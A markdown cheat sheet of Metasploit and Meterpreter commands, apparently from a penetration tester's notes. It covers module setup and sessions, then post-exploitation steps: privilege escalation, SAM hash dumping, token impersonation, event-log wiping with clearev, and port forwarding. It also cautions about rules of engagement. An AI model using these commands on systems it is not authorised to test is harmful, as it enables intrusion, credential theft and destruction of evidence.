#tools #metasploit #meterpreter #msf

# Metasploit Framework

Related: [shells-payloads](shells-payloads.md) · [sliver](sliver.md) · [common-applications](../Web/common-applications.md) · [pivoting](../Network/pivoting.md)

## Contents
- [msfconsole](#msfconsole)
- [Sessions](#sessions)
- [Meterpreter](#meterpreter)

## msfconsole
```text
search <name>
```
Find modules (`use <name>` or `use <index>` to load; `info` for details).

```text
show options
```
List module options (`show payloads`, `show targets`, `show advanced`).

```text
set RHOSTS <ip>; set LHOST <ip>; set payload <payload>
```
Configure a module (`setg` to set globally).

```text
check
```
Test whether the target is vulnerable (where supported).

```text
exploit -j -z
```
Run the exploit as a background job without interacting.

```text
db_nmap -sV -p- <ip>
```
Run Nmap and store results in the database.

## Sessions
```text
sessions -l
```
List sessions (`-l -v` verbose).

```text
sessions -u <sessionID>
```
Upgrade a basic shell to Meterpreter.

```text
sessions -K
```
Kill all sessions (`-c <cmd>` to run a command on all).

## Meterpreter
```text
sysinfo
```
Target system info (`ps`, `ls`, `getuid`).

```text
getsystem
```
Attempt SYSTEM-level escalation (`getprivs` to grab privileges).

```text
migrate <pid>
```
Migrate into another process.

```text
hashdump
```
Dump local SAM hashes. See [password-attacks](../Passwords/password-attacks.md).

```text
load incognito; list_tokens -u; impersonate_token <DOMAIN\\USER>
```
Token stealing / impersonation.

```text
upload <file>  /  download <file>
```
Transfer files. See [file-transfers](file-transfers.md).

```text
shell
```
Drop to a system shell (`background` to return, `clearev` to wipe logs).

> [!CAUTION]
> `clearev` wipes the Windows event logs outright — it's one of the noisiest, most detectable actions a session can take (generates its own "log cleared" Event ID 1102/104) and destroys evidence. Confirm this is within rules of engagement before running it.

```text
portfwd add -l 3300 -p 3389 -r <TARGET>
```
Pivot/port-forward through the session. See [pivoting](../Network/pivoting.md).
